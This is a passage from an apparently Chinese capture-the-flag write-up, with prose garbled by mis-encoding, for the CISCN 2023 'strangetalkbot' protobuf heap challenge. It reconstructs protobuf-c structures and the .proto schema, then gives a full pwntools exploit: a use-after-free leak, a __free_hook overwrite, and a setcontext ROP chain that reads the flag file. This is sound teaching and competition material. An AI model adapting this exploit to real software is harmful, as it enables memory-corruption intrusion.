ä½ç½®ã€‚æ‰€ä»¥è¿™ä¸ª1200å¤šè¡Œçš„å‡½æ•°å…¶å®å°±æ˜¯<code>protobuf_c_message_unpack</code>å‡½æ•°ã€‚</p><p>é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡è¿™ä¸ªå‡½æ•°æ‰€ä½¿ç”¨çš„å‚æ•°ï¼Œç›´æ¥åœ¨idaä¸­æ·»åŠ ç»“æ„ä½“è¿›è¡Œè¿›ä¸€æ­¥åˆ†æã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> ProtobufCMessageDescriptor struc ; (<span class="keyword">sizeof</span>=<span class="number">0x78</span>, mappedto_19)</span><br><span class="line"><span class="number">00000000</span> magic dd ?</span><br><span class="line"><span class="number">00000004</span> name dq ?</span><br><span class="line"><span class="number">0000000</span>C short_name dq ?</span><br><span class="line"><span class="number">00000014</span> c_name dq ?</span><br><span class="line"><span class="number">0000001</span>C package_name dq ?</span><br><span class="line"><span class="number">00000024</span> sizeof_message dq ?</span><br><span class="line"><span class="number">0000002</span>C n_fields dd ?</span><br><span class="line"><span class="number">00000030</span> fields dq ?</span><br><span class="line"><span class="number">00000038</span> fields_sorted_by_name dq ?</span><br><span class="line"><span class="number">00000040</span> n_field_ranges dd ?</span><br><span class="line"><span class="number">00000044</span> field_ranges dq ?</span><br><span class="line"><span class="number">0000004</span>C message_init ProtobufCMessage ?</span><br><span class="line"><span class="number">00000060</span> reserved1 dq ?</span><br><span class="line"><span class="number">00000068</span> reserved2 dq ?</span><br><span class="line"><span class="number">00000070</span> reserved3 dq ?</span><br><span class="line"><span class="number">00000078</span> ProtobufCMessageDescriptor ends</span><br><span class="line"><span class="number">00000078</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> ProtobufCMessage struc ; (<span class="keyword">sizeof</span>=<span class="number">0x14</span>, mappedto_21)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: ProtobufCMessageDescriptor/r</span><br><span class="line"><span class="number">00000000</span> descriptor dq ?</span><br><span class="line"><span class="number">00000008</span> n_unknown_fields dd ?</span><br><span class="line"><span class="number">0000000</span>C unknown_fields dq ?</span><br><span class="line"><span class="number">00000014</span> ProtobufCMessage ends</span><br><span class="line"><span class="number">00000014</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> ProtobufCAllocator struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_22)</span><br><span class="line"><span class="number">00000000</span> alloc dq ?</span><br><span class="line"><span class="number">00000008</span> <span class="built_in">free</span> dq ?</span><br><span class="line"><span class="number">00000010</span> allocator_data dq ?</span><br><span class="line"><span class="number">00000018</span> ProtobufCAllocator ends</span><br><span class="line"><span class="number">00000018</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> ProtobufCFieldDescriptor struc ; (<span class="keyword">sizeof</span>=<span class="number">0x44</span>, mappedto_23)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: .data.rel.ro:stru_9B60/r</span><br><span class="line"><span class="number">00000000</span> name dq ?</span><br><span class="line"><span class="number">00000008</span> id dd ?</span><br><span class="line"><span class="number">0000000</span>C label dd ?</span><br><span class="line"><span class="number">00000010</span> type dd ?</span><br><span class="line"><span class="number">00000014</span> quantifier_offset dd ?</span><br><span class="line"><span class="number">00000018</span> offset dd ?</span><br><span class="line"><span class="number">0000001</span>C descriptor dq ?</span><br><span class="line"><span class="number">00000024</span> default_value dq ?</span><br><span class="line"><span class="number">0000002</span>C flags dd ?</span><br><span class="line"><span class="number">00000030</span> reserved_flags dd ?</span><br><span class="line"><span class="number">00000034</span> reserved2 dq ?</span><br><span class="line"><span class="number">0000003</span>C reserved3 dq ?</span><br><span class="line"><span class="number">00000044</span> ProtobufCFieldDescriptor ends</span><br></pre></td></tr></table></figure><p>åœ¨å‰é¢æˆ‘ä»¬æåˆ°äº†<code>ProtobufCFieldDescriptor</code>ç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“ä¸­å­˜å‚¨ç€ç»“æ„ä½“ä¸­æ‰€æœ‰æˆå‘˜çš„æ•°æ®ç±»å‹ï¼Œå¹¶ä¸”ç¬¬ä¸€ä¸ªæˆå‘˜æ˜¯æŒ‡å‘å…¶åå­—çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ ¹æ®å­—ç¬¦ä¸²æ‰¾åˆ°ç»“æ„ä½“ç›¸å°çš„ä½ç½®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:0000000000009B60 80 70 00 00 00 00 00 00 01 00+stru_9B60 ProtobufCFieldDescriptor &lt;7080h, 1, 0, 4, 0, 18h, 0, 0, 0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 00 00 04 00 00 00+                                        ; DATA XREF: .data.rel.ro:0000000000009CB8â†“o</span><br><span class="line">.data.rel.ro:0000000000009BA4 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BA5 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BA6 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BA7 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BA8                               ; ProtobufCFieldDescriptor</span><br><span class="line">.data.rel.ro:0000000000009BA8 89 70 00 00 00 00 00 00 02 00+ProtobufCFieldDescriptor &lt;7089h, 2, 0, 4, 0, 20h, 0, 0, 0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000009BEC 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BED 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BEE 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BEF 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BF0                               ; ProtobufCFieldDescriptor</span><br><span class="line">.data.rel.ro:0000000000009BF0 90 70 00 00 00 00 00 00 03 00+ProtobufCFieldDescriptor &lt;7090h, 3, 0, 4, 0, 28h, 0, 0, 0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000009C34 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009C35 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009C36 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009C37 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009C38                               ; ProtobufCFieldDescriptor</span><br><span class="line">.data.rel.ro:0000000000009C38 98 70 00 00 00 00 00 00 04 00+ProtobufCFieldDescriptor &lt;7098h, 4, 0, 0Fh, 0, 30h, 0, 0, 0, 0, 0, 0&gt;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå¯ä»¥å¾—å‡ºï¼Œå‰é¢ä¸‰ä¸ªæˆå‘˜çš„æ•°æ®ç±»å‹ä¸º<code>sint64</code>ï¼Œæœ€åä¸€ä¸ªæˆå‘˜çš„æ•°æ®ç±»å‹ä¸º<code>bytes</code>ï¼Œæ‰€ä»¥å¯ä»¥è‡ªå·±å†™å‡º<code>proto</code>æ–‡ä»¶äº†ã€‚</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">Devicemsg</span></span>&#123;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">sint64</span> actionid = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">sint64</span> msgidx = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">sint64</span> msgsize = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">bytes</span> msgcontent = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨ä¸Šè¿°ä»£ç ç”Ÿæˆ<code>python</code>å¯¹åº”çš„æ–‡ä»¶ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span></span><br><span class="line"><span class="comment"># source: Devicemsg.proto</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">_b=sys.version_info[<span class="number">0</span>]&lt;<span class="number">3</span> <span class="keyword">and</span> (<span class="keyword">lambda</span> x:x) <span class="keyword">or</span> (<span class="keyword">lambda</span> x:x.encode(<span class="string">&#x27;latin1&#x27;</span>))</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> descriptor <span class="keyword">as</span> _descriptor</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> message <span class="keyword">as</span> _message</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> reflection <span class="keyword">as</span> _reflection</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> symbol_database <span class="keyword">as</span> _symbol_database</span><br><span class="line"><span class="comment"># @@protoc_insertion_point(imports)</span></span><br><span class="line"></span><br><span class="line">_sym_db = _symbol_database.Default()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DESCRIPTOR = _descriptor.FileDescriptor(</span><br><span class="line">  name=<span class="string">&#x27;Devicemsg.proto&#x27;</span>,</span><br><span class="line">  package=<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  syntax=<span class="string">&#x27;proto2&#x27;</span>,</span><br><span class="line">  serialized_options=<span class="literal">None</span>,</span><br><span class="line">  serialized_pb=_b(<span class="string">&#x27;\n\x0f\x44\x65vicemsg.proto\&quot;R\n\tDevicemsg\x12\x10\n\x08\x61\x63tionid\x18\x01 \x02(\x12\x12\x0e\n\x06msgidx\x18\x02 \x02(\x12\x12\x0f\n\x07msgsize\x18\x03 \x02(\x12\x12\x12\n\nmsgcontent\x18\x04 \x02(\x0c&#x27;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_DEVICEMSG = _descriptor.Descriptor(</span><br><span class="line">  name=<span class="string">&#x27;Devicemsg&#x27;</span>,</span><br><span class="line">  full_name=<span class="string">&#x27;Devicemsg&#x27;</span>,</span><br><span class="line">  filename=<span class="literal">None</span>,</span><br><span class="line">  file=DESCRIPTOR,</span><br><span class="line">  containing_type=<span class="literal">None</span>,</span><br><span class="line">  fields=[</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;actionid&#x27;</span>, full_name=<span class="string">&#x27;Devicemsg.actionid&#x27;</span>, index=<span class="number">0</span>,</span><br><span class="line">      number=<span class="number">1</span>, <span class="built_in">type</span>=<span class="number">18</span>, cpp_type=<span class="number">2</span>, label=<span class="number">2</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=<span class="number">0</span>,</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;msgidx&#x27;</span>, full_name=<span class="string">&#x27;Devicemsg.msgidx&#x27;</span>, index=<span class="number">1</span>,</span><br><span class="line">      number=<span class="number">2</span>, <span class="built_in">type</span>=<span class="number">18</span>, cpp_type=<span class="number">2</span>, label=<span class="number">2</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=<span class="number">0</span>,</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;msgsize&#x27;</span>, full_name=<span class="string">&#x27;Devicemsg.msgsize&#x27;</span>, index=<span class="number">2</span>,</span><br><span class="line">      number=<span class="number">3</span>, <span class="built_in">type</span>=<span class="number">18</span>, cpp_type=<span class="number">2</span>, label=<span class="number">2</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=<span class="number">0</span>,</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;msgcontent&#x27;</span>, full_name=<span class="string">&#x27;Devicemsg.msgcontent&#x27;</span>, index=<span class="number">3</span>,</span><br><span class="line">      number=<span class="number">4</span>, <span class="built_in">type</span>=<span class="number">12</span>, cpp_type=<span class="number">9</span>, label=<span class="number">2</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=_b(<span class="string">&quot;&quot;</span>),</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">  ],</span><br><span class="line">  extensions=[</span><br><span class="line">  ],</span><br><span class="line">  nested_types=[],</span><br><span class="line">  enum_types=[</span><br><span class="line">  ],</span><br><span class="line">  serialized_options=<span class="literal">None</span>,</span><br><span class="line">  is_extendable=<span class="literal">False</span>,</span><br><span class="line">  syntax=<span class="string">&#x27;proto2&#x27;</span>,</span><br><span class="line">  extension_ranges=[],</span><br><span class="line">  oneofs=[</span><br><span class="line">  ],</span><br><span class="line">  serialized_start=<span class="number">19</span>,</span><br><span class="line">  serialized_end=<span class="number">101</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">DESCRIPTOR.message_types_by_name[<span class="string">&#x27;Devicemsg&#x27;</span>] = _DEVICEMSG</span><br><span class="line">_sym_db.RegisterFileDescriptor(DESCRIPTOR)</span><br><span class="line"></span><br><span class="line">Devicemsg = _reflection.GeneratedProtocolMessageType(<span class="string">&#x27;Devicemsg&#x27;</span>, (_message.Message,), <span class="built_in">dict</span>(</span><br><span class="line">  DESCRIPTOR = _DEVICEMSG,</span><br><span class="line">  __module__ = <span class="string">&#x27;Devicemsg_pb2&#x27;</span></span><br><span class="line">  <span class="comment"># @@protoc_insertion_point(class_scope:Devicemsg)</span></span><br><span class="line">  ))</span><br><span class="line">_sym_db.RegisterMessage(Devicemsg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># @@protoc_insertion_point(module_scope)</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨å°±åªéœ€è¦æ‹¿ç€è¿™ä¸ªæ–‡ä»¶å»ä½¿ç”¨å³å¯ï¼Œåç»­çš„æ¼æ´åˆ©ç”¨éƒ¨åˆ†æ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œå°±ä¸è¯¦ç»†è¯´äº†ã€‚</p><h3 id="ç»¼ä¸Šå¯å¾—ï¼Œexp"><a href="#ç»¼ä¸Šå¯å¾—ï¼Œexp" class="headerlink" title="ç»¼ä¸Šå¯å¾—ï¼Œexp"></a>ç»¼ä¸Šå¯å¾—ï¼Œexp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Devicemsg_pb2</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">idx, size, content=<span class="string">b&#x27;&#x27;</span></span>):</span></span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">1</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = size</span><br><span class="line">    msg.msgcontent = content</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">2</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = content</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">3</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">4</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    create(i, <span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">7</span>-i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recv(<span class="number">0x50</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base =&gt; &quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">heap_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x590</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base =&gt; &quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">__free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">open_addr = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_addr = libc_base + libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ret_addr = libc_base + <span class="number">0x0000000000022679</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line">magic_gadget = libc_base + <span class="number">0x151990</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, flat(__free_hook, <span class="number">0</span>))</span><br><span class="line">create(<span class="number">8</span>, <span class="number">0xf0</span>)</span><br><span class="line">create(<span class="number">9</span>, <span class="number">0xf0</span>, flat(magic_gadget))</span><br><span class="line"></span><br><span class="line">flag_addr = heap_base + <span class="number">0x440</span></span><br><span class="line"></span><br><span class="line">rop_chain = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop_chain += flat(pop_rdi, flag_addr, pop_rsi, <span class="number">2</span>, open_addr)</span><br><span class="line">rop_chain += flat(pop_rdi, <span class="number">3</span>, pop_rsi, libc_base +</span><br><span class="line">                  libc.bss() + <span class="number">0x500</span>, pop_rdx, <span class="number">0x50</span>, read_addr)</span><br><span class="line">rop_chain += flat(pop_rdi, libc_base + libc.bss() + <span class="number">0x500</span>, puts_addr)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;./flag&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>, flag_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + flat(setcontext)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>) + rop_chain</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + flat(flag_addr + <span class="number">0x28</span>, ret_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>, payload)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><hr><p>å‚è€ƒé“¾æ¥ï¼š</p><p>â€‹    <a class="link"   href="https://xp0int.top/posts/2023/05/28/2023-CISCN-%E5%88%9D%E8%B5%9B-Writeup-By-Xp0int/#42-strangetalkbot" >https://xp0int.top/posts/2023/05/28/2023-CISCN-%E5%88%9D%E8%B5%9B-Writeup-By-Xp0int/#42-strangetalkbot<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://github1s.com/protobuf-c/protobuf-c/blob/HEAD/protobuf-c/protobuf-c.c#L3028" >https://github1s.com/protobuf-c/protobuf-c/blob/HEAD/protobuf-c/protobuf-c.c#L3028<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://www.jianshu.com/p/a7e88cb17031" >https://www.jianshu.com/p/a7e88cb17031<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
